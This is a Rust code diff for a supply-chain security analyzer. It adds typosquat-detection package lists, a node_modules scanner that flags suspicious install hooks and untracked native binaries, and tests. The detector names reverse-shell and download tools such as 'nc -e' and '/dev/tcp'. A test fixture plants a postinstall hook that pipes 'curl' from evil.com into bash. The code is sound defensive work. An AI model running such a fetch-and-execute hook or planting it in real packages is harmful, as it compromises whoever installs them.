@@ -20,6 +20,7 @@ pub struct SupplyChainFinding {
 pub struct LocalSupplyChainAnalyzer;
 
 pub const POPULAR_PACKAGES: &[&str] = &[
+    // JavaScript / TypeScript / Node.js
     "lodash",
     "express",
     "react",
@@ -35,6 +36,89 @@ pub const POPULAR_PACKAGES: &[&str] = &[
     "webpack",
     "babel",
     "rxjs",
+    "playwright",
+    "prisma",
+    "tailwind",
+    "tailwindcss",
+    "fastify",
+    "zod",
+    "electron",
+    "dotenv",
+    "cors",
+    "helmet",
+    "passport",
+    "nodemailer",
+    "winston",
+    "multer",
+    "socket.io",
+    "cheerio",
+    "yargs",
+    "prettier",
+    "eslint",
+    "typescript",
+    "vite",
+    "rollup",
+    "esbuild",
+    "nuxt",
+    "gatsby",
+    "svelte",
+    "immutable",
+    "underscore",
+    "ramda",
+    "dayjs",
+    "date-fns",
+    "luxon",
+    "uuid",
+    "nanoid",
+    "semver",
+    "glob",
+    "chokidar",
+    "fast-glob",
+    "rimraf",
+    "mkdirp",
+    "fs-extra",
+    "cross-env",
+    "nodemon",
+    "supertest",
+    "sinon",
+    "chai",
+    "mocha",
+    "jest",
+    "vitest",
+    "cypress",
+    "puppeteer",
+    "turbo",
+    "turbopack",
+    "swc",
+    "pnpm",
+    "yarn",
+    "corepack",
+    "lerna",
+    "nx",
+    "husky",
+    "ts-node",
+    "tsx",
+    "bun",
+    "deno",
+    "redux",
+    "zustand",
+    "formik",
+    "yup",
+    "graphql",
+    "jsonwebtoken",
+    "bcrypt",
+    "bcryptjs",
+    "mongoose",
+    "typeorm",
+    "knex",
+    "pg",
+    "mysql2",
+    "ioredis",
+    "sharp",
+    "body-parser",
+    "cookie-parser",
+    "morgan",
+    // Python / PyPI
     "requests",
     "urllib3",
     "flask",
@@ -49,6 +133,47 @@ pub const POPULAR_PACKAGES: &[&str] = &[
     "certifi",
     "click",
     "pip",
+    "fastapi",
+    "starlette",
+    "uvicorn",
+    "gunicorn",
+    "sqlalchemy",
+    "alembic",
+    "celery",
+    "redis",
+    "pydantic",
+    "httpx",
+    "aiohttp",
+    "beautifulsoup4",
+    "matplotlib",
+    "seaborn",
+    "scikit-learn",
+    "tensorflow",
+    "keras",
+    "torch",
+    "torchvision",
+    "torchaudio",
+    "transformers",
+    "huggingface-hub",
+    "accelerate",
+    "datasets",
+    "tokenizers",
+    "tiktoken",
+    "openai",
+    "anthropic",
+    "langchain",
+    "llama-index",
+    "chromadb",
+    "setuptools",
+    "wheel",
+    "twine",
+    "virtualenv",
+    "poetry",
+    "black",
+    "flake8",
+    "mypy",
+    "ruff",
+    // Rust / crates.io
     "serde",
     "tokio",
     "syn",
@@ -64,6 +189,61 @@ pub const POPULAR_PACKAGES: &[&str] = &[
     "reqwest",
     "clap",
     "tracing",
+    "actix-web",
+    "rocket",
+    "warp",
+    "axum",
+    "tonic",
+    "tower",
+    "sqlx",
+    "diesel",
+    "sea-orm",
+    "bytes",
+    "async-trait",
+    "parking_lot",
+    "crossbeam",
+    "rayon",
+    "dashmap",
+    "once_cell",
+    "lazy_static",
+    "indexmap",
+    "hashbrown",
+    "ring",
+    "rustls",
+    "sha2",
+    "blake3",
+    "hex",
+    "base64",
+    "serde_json",
+    "toml",
+    "walkdir",
+    "tempfile",
+    // Go
+    "gin",
+    "fiber",
+    "echo",
+    "mux",
+    "chi",
+    "gorm",
+    "zap",
+    "logrus",
+    "zerolog",
+    "cobra",
+    "viper",
+    "grpc",
+    "protobuf",
+    "testify",
+    // Java / Maven
+    "log4j-core",
+    "spring-core",
+    "spring-boot",
+    "jackson-databind",
+    "commons-io",
+    "commons-lang3",
+    "guava",
+    "slf4j-api",
+    "junit",
+    "mockito-core",
 ];
 
 impl LocalSupplyChainAnalyzer {
@@ -81,6 +261,9 @@ impl LocalSupplyChainAnalyzer {
 
         // 4. Scan source files and dependency trees
         Self::scan_source_files(root, &mut findings);
+
+        // 5. Dedicated Third-Party Inspection of node_modules (PRD Recommendation 4)
+        Self::scan_node_modules(root, &mut findings);
 
         findings
     }
@@ -660,6 +843,134 @@ impl LocalSupplyChainAnalyzer {
         findings
     }
 
+    /// Dedicated Third-Party Inspection of node_modules (PRD Recommendation 4)
+    /// Audits untrusted third-party dependencies for undeclared lifecycle hooks, network egress,
+    /// reverse shells, typosquatted dependency names, and untracked native binary blobs (.node, .dll, .so, .dylib).
+    pub fn scan_node_modules(root: &Path, findings: &mut Vec<SupplyChainFinding>) {
+        let nm_dir = root.join("node_modules");
+        if !nm_dir.is_dir() {
+            return;
+        }
+
+        for entry in WalkDir::new(&nm_dir)
+            .max_depth(3)
+            .into_iter()
+            .filter_entry(|e| {
+                let name = e.file_name().to_string_lossy();
+                !name.starts_with('.') && name != "test" && name != "tests" && name != "docs"
+            })
+            .flatten()
+        {
+            let path = entry.path();
+            let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
+
+            if file_name == "package.json" {
+                if let Ok(content) = fs::read_to_string(path) {
+                    let rel = path
+                        .strip_prefix(root)
+                        .unwrap_or(path)
+                        .to_string_lossy()
+                        .replace('\\', "/");
+                    if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
+                        let pkg_name = val
+                            .get("name")
+                            .and_then(|n| n.as_str())
+                            .unwrap_or("unknown");
+
+                        // Check typosquatting of third-party package
+                        let typos = Self::check_package(pkg_name, "", "npm");
+                        findings.extend(typos);
+
+                        if let Some(scripts) = val.get("scripts").and_then(|s| s.as_object()) {
+                            for (hook, cmd_val) in scripts {
+                                if hook == "preinstall"
+                                    || hook == "install"
+                                    || hook == "postinstall"
+                                {
+                                    let cmd = cmd_val.as_str().unwrap_or("");
+                                    let is_egress = cmd.contains("curl")
+                                        || cmd.contains("wget")
+                                        || cmd.contains("powershell")
+                                        || cmd.contains("Invoke-WebRequest")
+                                        || cmd.contains("fetch(")
+                                        || cmd.contains("http.get")
+                                        || cmd.contains("net.connect");
+                                    let is_shell = cmd.contains("nc -e")
+                                        || cmd.contains("sh -i")
+                                        || cmd.contains("bash -i")
+                                        || cmd.contains("/dev/tcp");
+                                    let is_eval = cmd.contains("eval(")
+                                        || cmd.contains("Buffer.from")
+                                        || cmd.contains("atob(");
+
+                                    if is_egress || is_shell || is_eval {
+                                        findings.push(SupplyChainFinding {
+                                            rule_id: "SC-002".to_string(),
+                                            signal_name: "third_party_malicious_lifecycle_script".to_string(),
+                                            severity: SeverityLevel::Critical,
+                                            message: format!(
+                                                "Third-party package '{}' executes suspicious lifecycle hook '{}': {}",
+                                                pkg_name, hook, cmd
+                                            ),
+                                            file_path: Some(rel.clone()),
+                                            line: None,
+                                            snippet: Some(cmd.to_string()),
+                                        });
+                                    } else {
+                                        findings.push(SupplyChainFinding {
+                                            rule_id: "SC-001".to_string(),
+                                            signal_name: "third_party_lifecycle_script".to_string(),
+                                            severity: SeverityLevel::Medium,
+                                            message: format!(
+                                                "Third-party dependency '{}' declares lifecycle hook '{}': {}",
+                                                pkg_name, hook, cmd
+                                            ),
+                                            file_path: Some(rel.clone()),
+                                            line: None,
+                                            snippet: Some(format!("\"{}\": \"{}\"", hook, cmd)),
+                                        });
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } else if file_name.ends_with(".node")
+                || file_name.ends_with(".dll")
+                || file_name.ends_with(".so")
+                || file_name.ends_with(".dylib")
+            {
+                let rel = path
+                    .strip_prefix(root)
+                    .unwrap_or(path)
+                    .to_string_lossy()
+                    .replace('\\', "/");
+                let parent = path.parent();
+                let has_build_manifest = parent
+                    .map(|p| {
+                        p.join("binding.gyp").exists()
+                            || p.join("Cargo.toml").exists()
+                            || p.join("package.json").exists()
+                    })
+                    .unwrap_or(false);
+                if !has_build_manifest {
+                    findings.push(SupplyChainFinding {
+                        rule_id: "SC-011".to_string(),
+                        signal_name: "untracked_third_party_native_binary".to_string(),
+                        severity: SeverityLevel::High,
+                        message: format!(
+                            "Untracked precompiled native binary blob discovered in third-party dependency: {}",
+                            file_name
+                        ),
+                        file_path: Some(rel),
+                        line: None,
+                        snippet: None,
+                    });
+                }
+            }
+        }
+    }
+
     /// Check package name for typosquatting against top packages list (SC-010)
     pub fn check_package(name: &str, _version: &str, _ecosystem: &str) -> Vec<SupplyChainFinding> {
         let mut findings = Vec::new();
@@ -672,25 +983,32 @@ impl LocalSupplyChainAnalyzer {
             .replace("rn", "m")
             .replace("vv", "w");
 
+        let lower_len = lower.len();
+
         for &pop in POPULAR_PACKAGES {
             if lower == pop {
                 continue;
             }
-            let dist = damerau_levenshtein_distance(&lower, pop);
-            if dist == 1 {
-                findings.push(SupplyChainFinding {
-                    rule_id: "SC-010".to_string(),
-                    signal_name: "typosquat_top_10k".to_string(),
-                    severity: SeverityLevel::High,
-                    message: format!(
-                        "Package '{}' is a suspected typosquat of popular package '{}' (edit distance 1)",
-                        name, pop
-                    ),
-                    file_path: None,
-                    line: None,
-                    snippet: None,
-                });
-                break;
+            let pop_len = pop.len();
+
+            // Fast length pruning: distance 1 is only possible if |len1 - len2| <= 1
+            if (lower_len as isize - pop_len as isize).abs() <= 1 {
+                let dist = damerau_levenshtein_distance(&lower, pop);
+                if dist == 1 {
+                    findings.push(SupplyChainFinding {
+                        rule_id: "SC-010".to_string(),
+                        signal_name: "typosquat_top_10k".to_string(),
+                        severity: SeverityLevel::High,
+                        message: format!(
+                            "Package '{}' is a suspected typosquat of popular package '{}' (edit distance 1)",
+                            name, pop
+                        ),
+                        file_path: None,
+                        line: None,
+                        snippet: None,
+                    });
+                    break;
+                }
             }
 
             // Homoglyph confusable match (e.g. l0dash -> lodash, react-d0m -> react-dom)
@@ -836,6 +1154,12 @@ mod tests {
 
         let findings3 = LocalSupplyChainAnalyzer::check_package("l0dash", "1.0.0", "npm");
         assert!(findings3.iter().any(|f| f.rule_id == "SC-010"));
+
+        let findings4 = LocalSupplyChainAnalyzer::check_package("fast1fy", "4.0.0", "npm");
+        assert!(findings4.iter().any(|f| f.rule_id == "SC-010"));
+
+        let findings5 = LocalSupplyChainAnalyzer::check_package("playwr1ght", "1.30.0", "npm");
+        assert!(findings5.iter().any(|f| f.rule_id == "SC-010"));
     }
 
     #[test]
@@ -864,5 +1188,24 @@ mod tests {
         let high_entropy = "9F8a7c2bE4d1f0A3c8B6e5D7f2A1c4E6b8D0f3A5c7E9b1D2f4A6c8E0b3D5f7A9";
         assert!(compute_shannon_entropy(low_entropy) < 2.0);
         assert!(compute_shannon_entropy(high_entropy) > 3.5);
+    }
+
+    #[test]
+    fn test_scan_node_modules_third_party_lifecycle_script() {
+        let temp_dir = std::env::temp_dir().join(format!("vexa-test-nm-{}", std::process::id()));
+        let nm_pkg = temp_dir.join("node_modules").join("malicious-dep");
+        let _ = std::fs::create_dir_all(&nm_pkg);
+        std::fs::write(
+            nm_pkg.join("package.json"),
+            r#"{"name": "malicious-dep", "version": "1.0.0", "scripts": {"postinstall": "curl -s http://evil.com/payload | bash"}}"#,
+        ).unwrap();
+
+        let mut findings = Vec::new();
+        LocalSupplyChainAnalyzer::scan_node_modules(&temp_dir, &mut findings);
+        let _ = std::fs::remove_dir_all(&temp_dir);
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "SC-002"
+                && f.signal_name == "third_party_malicious_lifecycle_script"));
     }
 }
